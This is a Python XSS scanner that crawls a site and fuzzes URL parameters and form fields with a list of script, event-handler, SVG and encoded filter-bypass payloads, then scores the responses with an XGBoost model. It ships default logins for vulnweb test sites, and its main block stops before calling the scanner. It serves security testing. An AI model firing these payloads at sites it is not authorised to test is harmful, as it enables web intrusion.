import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, unquote
import argparse
import os
import collections
from login_helper import perform_auto_login # Import helper
from colorama import Fore, Style
import csv
import re
import pandas as pd
import numpy as np
import datetime
import time
from report_generator import generate_report
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# Thread-safe lock for statistics updates
stats_lock = threading.Lock()

# Global Statistics for Report
SCAN_STATS = {
    "target_url": "",
    "scan_start": "",
    "scan_end": "",
    "duration_seconds": 0,
    "urls_scanned": 0,
    "total_payloads_tested": 0,
    "findings": [],
    "total_findings": 0
}

# Hardcoded feature order from training (based on error logs)
EXPECTED_FEATURES = [
    'url_length', 'url_special_characters', 'url_tag_script', 'url_attr_src', 
    'url_number_keywords_param', 'url_number_domain', 'html_tag_script', 
    'html_tag_iframe', 'html_tag_meta', 'html_tag_link', 'html_tag_form', 
    'html_tag_div', 'html_tag_img', 'html_tag_input', 'html_attr_action', 
    'html_attr_background', 'html_attr_href', 'html_event_onload', 
    'js_prop_referrer', 'html_number_keywords_evil', 'js_file', 'html_length', 
    'dom_location', 'js_dom_document', 'js_method_write', 
    'js_method_getElementsByTagName', 'js_method_alert', 'js_min_length', 
    'js_min_function_calls', 'js_string_max_length'
]

# Try to import xgboost
try:
    import xgboost as xgb
    XGB_AVAILABLE = True
except ImportError:
    XGB_AVAILABLE = False
    print("Warning: xgboost not found. ML features will be disabled.")

# --- START ML SETUP ---
MODEL = None
# Construct absolute path to model file (assumed to be in same dir as script)
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
MODEL_FILENAME = os.path.join(SCRIPT_DIR, "xgb_model.json")

def load_model():
    global MODEL
    if not XGB_AVAILABLE:
        return
    if os.path.exists(MODEL_FILENAME):
        try:
            MODEL = xgb.XGBClassifier()
            MODEL.load_model(MODEL_FILENAME)
            print(f"[+] Loaded XGBoost model from {MODEL_FILENAME}")
        except Exception as e:
            print(f"[-] Error loading model: {e}")
            MODEL = None
    else:
        print(f"[-] Model file {MODEL_FILENAME} not found. Running in standard mode.")

# --- END ML SETUP ---

# List of XSS payloads
# Optimized "Balanced" Payload List (High Coverage, Lower Count)
XSS_PAYLOADS = [
    # 1. Polyglots (Break out of contexts)
    '"> <script>alert(1)</script>',
    '\';alert(1)//',
    '";alert(1)//',
    
    # 2. Standard HTML Injection (Script Tags)
    '<script>alert(1)</script>',
    '<ScRiPt>alert(1)</sCrIpT>',
    '"><script>alert(1)</script>',
    '</script><script>alert(1)</script>',
    
    # 3. Attribute Injection (Event Handlers)
    '" onfocus=alert(1) autofocus "',
    '\' onfocus=alert(1) autofocus \'',
    '" onmouseover=alert(1) "',
    '<img src=x onerror=alert(1)>',
    '<img src=x onerror=prompt(1)>',
    
    # 4. SVG & Modern Vectors (Bypass Filters)
    '<svg/onload=alert(1)>',
    '<svg><script>alert(1)</script>',
    '<svg onload=alert(1)//',
    
    # 5. Protocol Injection (HREF/Action)
    'javascript:alert(1)',
    'javascript:prompt(1)',
    'java%09script:alert(1)', # Tab obfuscation
    
    # 6. CSS / Link Vectors (Found effective on Acunetix test site)
    '<link rel="stylesheet" href="javascript:alert(1)">',
    '<STYLE type="text/css">BODY{background:url("javascript:alert(1)")}</STYLE>',
    
    # 7. Obfuscated / WAF Bypasses
    '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
    '<img src=x onerror=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>',
    
    # 8. Frame / Object
    '<iframe src="javascript:alert(1)"></iframe>',
    '<iframe onload=alert(1)></iframe>',
    '<body onload=alert(1)>'
]

# Global variables
crawled_links = set()
found_vulnerabilities = set()

# Global Session
    # Initialize Session
session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
})

session.cookies.set("PHPSESSID", "1ga0osdggsuernnadkek5bmp20")

session.cookies.set("security_level", "0")

# --- FEATURE EXTRACTION FUNCTIONS ---

def extract_features_dict(url, soup, method="GET", body=None, label=0):
    """
    Extracts features and returns a dictionary matching the model's expected input.
    """
    features = {}
    
    # Save Metadata for CSV (but not used by model unless column matches)
    features["URL"] = url
    features["Method"] = method
    features["Body"] = body
    features["label"] = label

    try:
        decoded_url = unquote(url)
        features["url_length"] = len(decoded_url)
        features["url_special_characters"] = get_url_special_characters(url)
        features["url_tag_script"] = get_url_tag_script(url)
        features["url_attr_src"] = get_url_attr_src(url)
        features["url_number_keywords_param"] = get_url_number_keywords_param(url)
        features["url_number_domain"] = get_url_number_domain(url)
        
        features["html_tag_script"] = get_html_tag_script(soup)
        features["html_tag_iframe"] = get_html_tag_iframe(soup)
        
        # 1. Tags
        features["html_tag_meta"] = get_tag_count(soup, "meta")
        features["html_tag_link"] = get_tag_count(soup, "link")
        features["html_tag_form"] = get_tag_count(soup, "form")
        features["html_tag_div"]  = get_tag_count(soup, "div")
        features["html_tag_img"]  = get_tag_count(soup, "img")
        features["html_tag_input"]= get_tag_count(soup, "input")

        # 2. Attributes & Events
        features["html_attr_action"] = get_attr_count(soup, "action")
        features["html_attr_background"] = get_attr_count(soup, "background")
        features["html_attr_href"] = get_attr_count(soup, "href")
        features["html_event_onload"] = get_attr_count(soup, "onload")
        
        features["html_number_keywords_evil"] = get_html_number_keywords_evil(soup)
        features["html_length"] = get_html_length(soup)      # f66
        features["js_file"] = get_js_file_count(soup)
        
        dom_location, prop_referrer = get_js_combined_features(soup)
        features["dom_location"] = dom_location
        features["js_prop_referrer"] = prop_referrer
        
        dom_doc, meth_write, meth_get_tag, meth_alert, min_len, min_calls, max_len = get_js_extended_features(soup)
        features["js_dom_document"] = dom_doc
        features["js_method_write"] = meth_write
        features["js_method_getElementsByTagName"] = meth_get_tag
        features["js_method_alert"] = meth_alert
        features["js_min_length"] = min_len
        features["js_min_function_calls"] = min_calls
        features["js_string_max_length"] = max_len

    except Exception as e:
        print(f"[-] Feature Extraction Error: {e}")
        # Initialize defaults if extraction fails
        defaults = [
            "url_length", "url_special_characters", "url_tag_script", 
            "url_attr_src", "url_number_keywords_param", "url_number_domain",
            "html_tag_script", "html_tag_iframe", "html_tag_meta", "html_tag_link", 
            "html_tag_form", "html_tag_div", "html_tag_img", "html_tag_input",
            "html_attr_action", "html_attr_background", "html_attr_href", 
            "html_event_onload", "js_prop_referrer", "html_number_keywords_evil", 
            "js_file", "html_length", "dom_location", "js_dom_document", 
            "js_method_write", "js_method_getElementsByTagName", "js_method_alert", 
            "js_min_length", "js_min_function_calls", "js_string_max_length"
        ]
        for key in defaults:
            if key not in features:
                features[key] = 0

    return features

def save_features(url, soup, args, method="GET", body=None, label=0, features=None): 
    if not args.output: return

    # Allow passing pre-calculated features
    if features is None:
        features = extract_features_dict(url, soup, method, body, label)

    try:
        # --- Save to CSV ---
        csv_filename = args.output + "_features.csv"
        file_is_new = not os.path.isfile(csv_filename)
        
        # Fieldnames required (Order matters if using writerow, but DictWriter is safer)
        fieldnames = [
            "URL", "Method", "Body",
            "url_length", "url_special_characters", "url_tag_script", 
            "url_attr_src", "url_number_keywords_param", "url_number_domain",
            "html_tag_script", "html_tag_iframe",
            "html_tag_meta", "html_tag_link", "html_tag_form", 
            "html_tag_div", "html_tag_img", "html_tag_input",
            "html_attr_action", "html_attr_background", "html_attr_href", 
            "html_event_onload","js_prop_referrer","html_number_keywords_evil","js_file", "html_length", "dom_location",
            "js_dom_document", "js_method_write", "js_method_getElementsByTagName", 
            "js_method_alert", "js_min_length", "js_min_function_calls", 
            "js_string_max_length", "label"
        ]

        with open(csv_filename, mode='a', newline='', encoding='utf-8') as f:
            if file_is_new:
                writer = csv.DictWriter(f, fieldnames=fieldnames)
                writer.writeheader()
                writer.writerow(features)
            else:
                writer = csv.DictWriter(f, fieldnames=fieldnames)
                writer.writerow(features)
            
    except Exception as e:
        print(f"[-] CSV Error: {e}")


def get_js_extended_features(soup):
    count_document = 0
    count_write = 0
    count_get_tag = 0
    count_alert = 0
    min_len = 0
    max_len = 0
    func_calls = 0

    if not soup:
        return count_document, count_write, count_get_tag, count_alert, min_len, func_calls, max_len

    js_code = ""

    for script in soup.find_all("script"):
        if script.string:
            js_code += script.get_text() + "\n"

    for tag in soup.find_all(True):
        for attr_name, attr_value in tag.attrs.items():
            if attr_name.lower().startswith("on"):
                if isinstance(attr_value, list):
                    attr_value = " ".join(attr_value)
                js_code += attr_value + "\n"
            else:
                if isinstance(attr_value, list):
                     attr_value = " ".join(attr_value)
                
                if "javascript:" in attr_value.lower():
                     try:
                         code_part = attr_value.lower().split("javascript:", 1)[1]
                         js_code += code_part + "\n"
                     except IndexError:
                         pass

    if not js_code:
        return count_document, count_write, count_get_tag, count_alert, min_len, func_calls, max_len

    js_lower = js_code.lower()

    count_document = len(re.findall(r'document\.', js_lower))
    count_write = len(re.findall(r'document\.write', js_lower))
    count_get_tag = len(re.findall(r'\.getelementsbytagname', js_lower))
    count_alert = len(re.findall(r'alert\(', js_lower))

    strings = re.findall(r'["\'].*?["\']', js_code)
    if strings:
        lengths = [max(0, len(s) - 2) for s in strings]
        if lengths:
             min_len = min(lengths)
             max_len = max(lengths)
    
    func_calls = len(re.findall(r'\b(?!(?:if|while|for|switch|catch)\b)\w+\s*\(', js_code))

    return count_document, count_write, count_get_tag, count_alert, min_len, func_calls, max_len

def get_js_combined_features(soup):
    if not soup:
        return 0, 0

    js_code = ""
    for script in soup.find_all("script"):
        if script.string:
            js_code += script.string
            
    if not js_code:
        return 0, 0

    js_lower = js_code.lower()
    
    count_location = len(re.findall(r'location\.', js_lower))
    count_referrer = len(re.findall(r'\.referrer', js_lower))
    
    return count_location, count_referrer


def get_html_length(soup):
    if not soup: return 0
    return len(str(soup))

def get_js_file_count(soup):
    if not soup: return 0
    return len(soup.find_all("script", src=True))

def get_html_number_keywords_evil(soup):
    if not soup:
        return 0
    
    html_content = str(soup).lower()
    
    evil_keywords = [
        'javascript', 'vbscript', 'expression', 'applet', 'meta', 
        'xml', 'blink', 'link', 'style', 'script', 'embed', 
        'object', 'iframe', 'frame', 'frameset', 'ilayer', 
        'layer', 'bgsound', 'title', 'base'
    ]
    
    total_count = sum(html_content.count(keyword) for keyword in evil_keywords)
    
    return total_count

def get_js_prop_referrer(soup):
    if not soup:
        return 0
        
    js_code = ""
    for script in soup.find_all("script"):
        if script.string:
            js_code += script.string
            
    if not js_code:
        return 0
        
    matches = re.findall(r'\.referrer', js_code.lower())
    return len(matches)

def get_tag_count(soup, tag_name):
    if not soup: return 0
    return len(soup.find_all(tag_name))

def get_attr_count(soup, attr_name):
    if not soup: return 0
    return len(soup.find_all(attrs={attr_name: True}))

def get_html_tag_iframe(soup):
    if not soup:
        return 0
    return len(soup.find_all("iframe"))

def get_html_tag_script(soup):
    if not soup:
        return 0
    return len(soup.find_all("script"))

def get_url_number_keywords_param(url):
    decoded_url = unquote(url).lower()
    target_keywords = ['search', 'login', 'signup', 'query', 'contact', 'url', 'redirect']
    count = 0
    for keyword in target_keywords:
        if keyword in decoded_url:
            count += 1
    return count

def get_url_number_domain(url):
    decoded_url = unquote(url).lower()
    count = decoded_url.count("http")
    return max(count, 1)

def extract_url_length(url):
    decoded_url = unquote(url)
    length = len(decoded_url)
    return length

def get_url_special_characters(url):
    decoded_url = unquote(url)
    special_chars = ['<', '>', '/', '"', "'", '(', ')', ';']
    count = sum(decoded_url.count(char) for char in special_chars)
    return count

def get_url_tag_script(url):
    decoded_url = unquote(url).lower()
    return 1 if "script" in decoded_url else 0

def get_url_attr_src(url):
    decoded_url = unquote(url).lower()
    return 1 if "src=" in decoded_url or " src " in decoded_url else 0

def print_crawled_links():
    print(f"\n[+] Links crawled:")
    for link in crawled_links:
        print(f"    {link}")
    print()

def check_vulnerability(payload, resp_text):
    """
    Implements flexible matching and verification:
    1. Case-insensitive check.
    2. Whitespace-flexible check (using regex).
    3. Checks if dangerous characters in the payload are reflected UNENCODED.
    """
    # 1. Trivial Check: Exact match (fastest)
    if payload in resp_text:
        return True

    # 2. Case-Insensitive Check
    if payload.lower() in resp_text.lower():
        # Confirm that what matched isn't just safe text (e.g. inside a <textarea> or encoded)
        # But generally, if <script> comes back as <SCRIPT>, it's valid HTML.
        # We need to ensure the critical chars (<, >, ", ') match the payload's intent.
        return True

    # 3. Flexible Regex Match (Option 1)
    # Escape payload for regex, but replace spaces with \s+ to allow flexible whitespace
    try:
        # distinct sensitive chars
        dangerous_chars = ['<', '>', '"', "'", '(', ')', ';']
        
        # If the payload has dangerous chars, we MUST find them unencoded.
        # Construct a regex that matches the payload but allows case variation
        # and whitespace variation.
        
        regex_pattern = re.escape(payload)
        regex_pattern = regex_pattern.replace(r'\ ', r'\s*') # Allow flexible spaces
        
        if re.search(regex_pattern, resp_text, re.IGNORECASE):
            return True
            
    except Exception:
        pass

    return False

def get_dummy_value(input_type):
    """Returns a valid dummy value based on input type to bypass validation."""
    input_type = input_type.lower()
    if input_type == "number":
        return "1"
    elif input_type == "email":
        return "test@example.com"
    elif input_type == "url":
        return "http://example.com"
    elif input_type == "tel":
        return "555-555-5555"
    elif input_type == "date":
        return "2023-01-01"
    else:
        return "test"

def get_all_forms(url):
    try:
        response = session.get(url, timeout=10)
        if response.status_code != 200:
            print(f"{Fore.RED}[!] Error accessing {url}: Status Code {response.status_code}{Style.RESET_ALL}")
            return []
            
        soup = bs(response.content, "html.parser")
        forms = soup.find_all("form")
        return forms
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[-] Connection Error in get_all_forms: {e}{Style.RESET_ALL}")
        return []

def get_form_details(form):
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    
    # Find all input elements
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    
    # Find all textarea elements (like tfText in showthread.asp)
    for textarea in form.find_all("textarea"):
        input_name = textarea.attrs.get("name")
        inputs.append({"type": "textarea", "name": input_name})
    
    # Find all select elements
    for select in form.find_all("select"):
        input_name = select.attrs.get("name")
        inputs.append({"type": "select", "name": input_name})
    
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, value, target_input_name=None):
    target_url = urljoin(url, form_details.get("action", ""))
    inputs = form_details.get("inputs", [])
    data = {}

    for inp in inputs:
        name = inp.get("name")
        inp_type = inp.get("type", "text").lower()
        
        if name:
            if target_input_name and name == target_input_name:
                # Inject payload into the target input
                data[name] = value
            else:
                # Use dummy value for other inputs to pass validation
                # But if we don't have a target (legacy/fallback), inject into all text fields?
                # User requested separate fuzzing, so we should enforce target logic.
                # If target_input_name is provided, use it.
                # If NOT provided (legacy call?), default to old behavior.
                
                if target_input_name:
                    data[name] = get_dummy_value(inp_type)
                else:
                    # Legacy behavior: inject into all compatible fields
                    if inp_type in ("text", "search", "email", "tel", "url"):
                        data[name] = value
                    else:
                        data[name] = inp.get("value") # Keep default if present, or None

    try:
        method = form_details.get("method", "get").lower()
        if method == "post":
            response = session.post(target_url, data=data)
        else:
            response = session.get(target_url, params=data)

        req = response.request
        # FIX: Use original target_url (form action) instead of req.url (which may be redirected)
        # Also track the page where the form was found (url parameter)
        request_info = {
            "method": req.method,
            "url": target_url,  # Original form action URL, NOT redirect destination
            "original_page_url": url,  # Page where the form was found
            "final_url": req.url,  # Keep the redirected URL for reference if needed
            "body": req.body
        }
        return response, request_info

    except requests.exceptions.RequestException as e:
        print(f"DEBUG: submit_form failed for {target_url} with error: {e}")
        return None, {"method": form_details.get("method", "get"), "url": target_url, "original_page_url": url, "final_url": target_url, "body": None}

def get_all_links(url):
    try:
        response = session.get(url, timeout=10)
        soup = bs(response.content, "html.parser")
        links = []
        for link in soup.find_all("a"):
            href = link.get("href")
            if href:
                full_url = urljoin(url, href)
                # Filter out javascript:, mailto:, tel:
                if full_url.lower().startswith(("http://", "https://")):
                    links.append(full_url)
        return links
    except requests.exceptions.RequestException as e:
        print(f"[-] Error crawling links from {url}: {e}")
        return []

# --- MAIN SCANNING FUNCTION WITH ML ---

def test_payload_worker(payload, url, param_name, params, parsed, args, stop_event):
    """
    Worker function to test a single payload. Called by thread pool.
    Returns result dict if vulnerable, None otherwise.
    """
    global MODEL, session
    
    # Check if we should stop early
    if stop_event.is_set():
        return None
    
    fuzzed_params = params.copy()
    fuzzed_params[param_name] = [payload]
    
    new_query = urlencode(fuzzed_params, doseq=True)
    fuzzed_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
    
    try:
        response = session.get(fuzzed_url, allow_redirects=False, timeout=args.timeout)
        
        try: 
            raw_text = response.content.decode('utf-8', errors='ignore')
            resp_text = unquote(raw_text)
        except: 
            resp_text = str(response.content)
        
        soup = bs(resp_text, "html.parser")
        features = extract_features_dict(fuzzed_url, soup, response.request.method, None)
        
        is_ml_vulnerable = False
        vuln_prob = 0.0
        
        if MODEL is not None:
            try:
                df = pd.DataFrame([features]).drop(columns=['label', 'URL', 'Method', 'Body'], errors='ignore')
                df = df[EXPECTED_FEATURES]
                probas = MODEL.predict_proba(df)
                vuln_prob = probas[0][1]
                
                if vuln_prob >= args.threshold:
                    is_ml_vulnerable = True
            except:
                pass
        
        # Heuristic for dataset labeling
        is_heuristic_vulnerable = check_vulnerability(payload, resp_text)
        label = 1 if is_heuristic_vulnerable else 0
        features['label'] = label
        
        # Thread-safe stats update
        with stats_lock:
            SCAN_STATS["total_payloads_tested"] += 1
        
        # Save features if needed
        if args.dataset_mode or args.output:
            save_features(fuzzed_url, soup, args, response.request.method, None, label=label, features=features)
        
        if is_ml_vulnerable:
            return {
                'is_vulnerable': True,
                'fuzzed_url': fuzzed_url,
                'param_name': param_name,
                'payload': payload,
                'vuln_prob': vuln_prob,
                'parsed': parsed
            }
        
        return None
        
    except requests.exceptions.RequestException:
        return None


def scan_url_params(url, args):
    """
    Scans URL parameters (e.g. ?id=1) for XSS vulnerabilities.
    Uses parallel processing for faster scanning.
    """
    global found_vulnerabilities, MODEL
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    # Handle hidden parameters for Logout.asp
    path_lower = parsed.path.lower()
    if "logout.asp" in path_lower or "login.asp" in path_lower:
        if "returl" not in [k.lower() for k in params.keys()]:
            print(f"{Fore.CYAN}[i] Hidden Parameter Injection: Adding 'RetURL' to {url}{Style.RESET_ALL}")
            params["RetURL"] = ["/"]

    if not params:
        return

    print(f"[*] Scanning URL parameters on: {url}")

    url_vulnerable = False
    stop_event = threading.Event()

    for param_name in params.keys():
        if url_vulnerable and not args.dataset_mode:
            print(f"{Fore.YELLOW}[i] Skipping remaining params for {url} (Vulnerability detected){Style.RESET_ALL}")
            return

        # Use ThreadPoolExecutor for parallel payload testing
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {
                executor.submit(test_payload_worker, payload, url, param_name, params, parsed, args, stop_event): payload
                for payload in XSS_PAYLOADS
            }
            
            for future in as_completed(futures):
                if stop_event.is_set() and not args.dataset_mode:
                    break
                    
                result = future.result()
                
                if result and result['is_vulnerable']:
                    # Deduplication: Use base URL (without query params) + param name
                    # This groups Login.asp?RetURL=X and Login.asp?RetURL=Y as the same page
                    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}".lower()
                    vuln_id = f"{base_url}?param={param_name}"
                    
                    if vuln_id not in found_vulnerabilities:
                        found_vulnerabilities.add(vuln_id)
                        print(f"\n{Fore.GREEN}[+] XSS Detected (ML Prediction)!{Style.RESET_ALL}")
                        print(f"[*] URL: {result['fuzzed_url']}")
                        print(f"[*] Parameter: {param_name}")
                        print(f"{Fore.YELLOW}[*] Payload: {result['payload']}{Style.RESET_ALL}")
                        
                        # Thread-safe report tracking
                        with stats_lock:
                            SCAN_STATS["findings"].append({
                                "url": result['fuzzed_url'],
                                "original_page_url": base_url,  # For report grouping
                                "parameter": param_name,
                                "payload": result['payload'],
                                "confidence": float(result['vuln_prob']),
                                "is_vulnerable": True,
                                "evidence": ["ML Prediction"],
                                "timestamp": datetime.datetime.now().isoformat()
                            })
                            SCAN_STATS["total_findings"] += 1

                        if args.output:
                            with open(args.output, "a") as f:
                                f.write(f"XSS: {result['fuzzed_url']}\nParameter: {param_name}\nPayload: {result['payload']}\n\n")

                    url_vulnerable = True
                    if not args.dataset_mode:
                        stop_event.set()  # Signal other threads to stop
                        break


def scan_xss(start_url, args):
    global crawled_links, found_vulnerabilities
    
    # Use a list as a queue for BFS
    queue = [start_url]
    scanned_urls = set()
    
    # Extract domain from start_url for scope constraint
    try:
        start_parsed = urlparse(start_url)
        target_domain = start_parsed.netloc
        domain_base = f"{start_parsed.scheme}://{start_parsed.netloc}"
    except Exception:
        print("[-] Invalid Start URL")
        return

    while queue:
        url = queue.pop(0)
        
        if url in scanned_urls:
            continue
        scanned_urls.add(url)
        SCAN_STATS["urls_scanned"] += 1
        
        # Scope check (redundant but safe)
        try:
            parsed = urlparse(url)
            if parsed.netloc != target_domain:
                continue
        except:
            continue

        # 1. Scan Parameters
        scan_url_params(url, args)
        
        # 2. Scan Forms
        forms = get_all_forms(url)
        if forms:
            print(f"\n[+] Detected {len(forms)} forms on {url}")
        
        # Check robots.txt (Optimization: check once per domain? strictly per logic provided: per URL check is fine)
        crawl_allowed = True
        if args.obey_robots:
             # Basic robot check logic from original script
             robot_parser = RobotFileParser()
             robot_parser.set_url(urljoin(domain_base, "/robots.txt"))
             try:
                 robot_parser.read()
                 crawl_allowed = robot_parser.can_fetch("*", url)
             except: 
                 crawl_allowed = False

        if crawl_allowed:
            for form in forms:
                form_details = get_form_details(form)
                
                # ... [Form Scanning Logic - preserved] ...
                # To keep this block concise, I will call a helper or inline it. 
                # The original script had a huge block here. 
                # I will Refactor form scanning into a function `scan_forms(url, forms, args)`?
                # The user didn't ask for massive refactor, but it helps. 
                # However, to be safe with `replace_file_content`, I should probably try to keep logic similar or copy it.
                # Copying the whole body is risky if I miss something.
                # Let's extract `scan_forms` in a separate `replace`? No, I must do it all here.
                
                # Let's paste the form scanning logic here.
                # Iterate over each input in the form to fuzz them individually
                form_inputs = form_details.get("inputs", [])
                
                for input_entry in form_inputs:
                    target_input_name = input_entry.get("name")
                    input_type = input_entry.get("type", "text").lower()
                    
                    if not target_input_name:
                        continue
                        
                    # Skip non-fuzzable inputs (e.g. submit, button, image, hidden?)
                    # Hidden fields CAN be vulnerable, so we might want to fuzz them.
                    # But we usually fuzz text-like fields.
                    # Let's fuzz text, search, url, email, password, number, hidden, textarea
                    if input_type not in ["text", "search", "url", "email", "password", "number", "hidden", "textarea"]:
                        continue

                    if args.verbose_ml:
                        print(f"    [>] Fuzzing input: {target_input_name} ({input_type})")

                    # Track if THIS SPECIFIC INPUT is vulnerable (not the whole form)
                    input_vulnerable = False
                    
                    for payload in XSS_PAYLOADS:
                        SCAN_STATS["total_payloads_tested"] += 1
                        # Check if we found this input vulnerable already - if so, move to next input
                        if input_vulnerable and not args.dataset_mode:
                            break
                            
                        response, request_info = submit_form(form_details, url, payload, target_input_name=target_input_name)
                        if response is None:
                            continue

                        # DEBUG: Check if we are getting responses
                        # print(f"DEBUG: Testing payload {payload[:10]}... Status: {response.status_code}") 

                        req_url = request_info.get("url", "")  # Form action URL
                        original_page_url = request_info.get("original_page_url", url)  # Page where form was found
                        req_method = request_info.get("method", "GET")
                        req_body = request_info.get("body", "")
                        
                        # Fix for encoded form reflections (consistency with scan_url_params)
                        try: 
                            raw_text = response.content.decode('utf-8', errors='ignore')
                            resp_text = unquote(raw_text)
                        except: 
                            resp_text = str(response.content)

                        try: attack_soup = bs(resp_text, "html.parser") # Use decoded text
                        except: attack_soup = None
                        
                        features = extract_features_dict(req_url, attack_soup, req_method, req_body)
                        is_ml_vuln = False
                        if MODEL:
                             try:
                                df = pd.DataFrame([features]).drop(columns=['label', 'URL', 'Method', 'Body'], errors='ignore')
                                # Enforce column order to match training
                                df = df[EXPECTED_FEATURES]
                                
                                probas = MODEL.predict_proba(df)
                                vuln_prob = probas[0][1]
                                
                                if args.verbose_ml:
                                    print(f"[*] Payload: {payload[:30]}... | Prob: {vuln_prob:.4f}")

                                if vuln_prob >= args.threshold: is_ml_vuln = True
                             except Exception as e:
                                 print(f"DEBUG ML ERROR: {e}")
                                 pass

                        # Label is still useful for dataset mode ("ground truth"), so we keep the check strictly for that.
                        is_heur_vuln = check_vulnerability(payload, resp_text)
                        
                        if args.dataset_mode or args.output:
                            label = 1 if is_heur_vuln else 0
                            features['label'] = label
                            save_features(req_url, attack_soup, args, req_method, req_body, label=label, features=features)
                        
                        # USER REQUEST: STRICT ML DECISION
                        # Only report if ML says it's vulnerable.
                        if is_ml_vuln:
                            # FIX: Use original_page_url for deduplication to avoid confusion with redirects
                            base = original_page_url.split('?')[0].lower()
                            vuln_key = f"{base}:{target_input_name}"  # Include parameter for better dedup
                            if vuln_key not in found_vulnerabilities:
                                found_vulnerabilities.add(vuln_key)
                                print(f"\n{Fore.GREEN}[+] Form XSS Detected (ML Prediction)!{Style.RESET_ALL}")
                                print(f"[*] Page: {original_page_url}")
                                print(f"[*] Form Action: {req_url}")
                                print(f"[*] Parameter: {target_input_name}")
                                print(f"[*] Payload: {payload}")
                                
                                # Report Tracking - include original_page_url for proper reporting
                                SCAN_STATS["findings"].append({
                                    "url": req_url,  # Form action URL
                                    "original_page_url": original_page_url,  # Page where form was found
                                    "parameter": target_input_name,
                                    "payload": payload,
                                    "confidence": float(vuln_prob) if 'vuln_prob' in locals() else 1.0,
                                    "is_vulnerable": True,
                                    "evidence": ["ML Prediction", "Form-based XSS"],
                                    "timestamp": datetime.datetime.now().isoformat()
                                })
                                SCAN_STATS["total_findings"] += 1

                                if args.output:
                                     with open(args.output, "a") as f:
                                        f.write(f"Form XSS: {req_url}\nPage: {original_page_url}\nParameter: {target_input_name}\nPayload: {payload}\nModel Predicted: {is_ml_vuln}\n\n")

                            input_vulnerable = True
                            if not args.dataset_mode: 
                                break

        # 3. Crawl New Links
        if args.crawl:
            if args.max_links and len(crawled_links) >= args.max_links:
                print(f"{Fore.CYAN}[-] Maximum links reached (limit {args.max_links}). Stopping crawl.{Style.RESET_ALL}")
                # We do NOT exit. We just stop adding to queue.
                # However, we must continue scanning what's IN the queue? 
                # Or stop completely? The user likely wants to stop finding NEW things.
                # But `exit(0)` was too harsh.
                # Let's just Stop Adding.
                pass 
            else:
                print(f"\n[+] Crawling links from {url}")
                current_links = get_all_links(url)
                for link in current_links:
                    if link not in scanned_urls and link not in crawled_links:
                        # Validate scope
                        try:
                            l_parsed = urlparse(link)
                            if l_parsed.netloc == target_domain:
                                crawled_links.add(link)
                                queue.append(link)
                                if args.max_links and len(crawled_links) >= args.max_links:
                                    print(f"{Fore.CYAN}[-] Maximum links count reached.{Style.RESET_ALL}")
                                    break
                        except: pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Extended XSS Vulnerability scanner script with ML.")
    parser.add_argument("url", help="URL to scan for XSS vulnerabilities")
    parser.add_argument("-c", "--crawl", action="store_true", help="Crawl links from the given URL")
    parser.add_argument("-m", "--max-links", type=int, default=0, help="Maximum number of links to visit. Default 0.")
    parser.add_argument("--obey-robots", action="store_true", help="Obey robots.txt rules")
    parser.add_argument("-o", "--output", help="Output file to save the results")
    parser.add_argument("--report", help="HTML report output filename")
    # NEW ARGUMENT
    parser.add_argument("--dataset-mode", action="store_true", help="Run all payloads to generate dataset, even if vulnerability found.")
    
    parser.add_argument("--threshold", type=float, default=0.5, help="ML probability threshold (default: 0.5)")
    parser.add_argument("--verbose-ml", action="store_true", help="Print ML probability scores for all payloads")
    parser.add_argument("--cookie", help="Session cookie string (e.g. 'ASPSESSIONID=xyz')")
    parser.add_argument("--username", help="Username for auto-login")
    parser.add_argument("--password", help="Password for auto-login")
    parser.add_argument("--login-url", help="URL of the login page (if different from target)")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Request timeout")
    parser.add_argument("--threads", type=int, default=5, help="Number of parallel threads (1-20, default: 5)")
    args = parser.parse_args()
    
    # Validate thread count
    args.threads = max(1, min(20, args.threads))
    
    # Initialize Stats
    SCAN_STATS["target_url"] = args.url
    SCAN_STATS["scan_start"] = datetime.datetime.now().isoformat()
    start_time = time.time()
    
    # Auto-Login Logic: Default Credentials for Vulnweb sites
    if not args.username and not args.cookie:
        if "testasp.vulnweb.com" in args.url:
            print("[*] Target is testasp.vulnweb.com. Using default credentials (admin/none).")
            args.username = "admin"
            args.password = "none"
            args.login_url = "http://testasp.vulnweb.com/Login.asp"
        elif "testphp.vulnweb.com" in args.url:
            print("[*] Target is testphp.vulnweb.com. Using default credentials (test/test).")
            args.username = "test"
            args.password = "test"
            args.login_url = "http://testphp.vulnweb.com/login.php"
        elif "testhtml5.vulnweb.com" in args.url:
            print("[*] Target is testhtml5.vulnweb.com. Using default credentials (admin/none).")
            args.username = "admin"
            args.password = "none" # User requested 'none'
            args.login_url = "http://testhtml5.vulnweb.com" # Form is on the homepage

    if args.username and args.password:
        l_url = args.login_url if args.login_url else args.url
        # If user didn't provide a specific login URL, assume the target URL is fine (or main domain)
        perform_auto_login(session, l_url, args.username, args.password)

    if args.cookie:
        session.headers.update({"Cookie": args.cookie})
        print(f"[+] Authenticated Scan Enabled. Cookie: {args.cookie[:20]}...")
    
    # Validation
    if not args.url.startswith("http"):
        print("[-] Please provide a valid URL starting with http:// or https://")
        exit(1)

    # Load model
    load_model()
    
    # Start
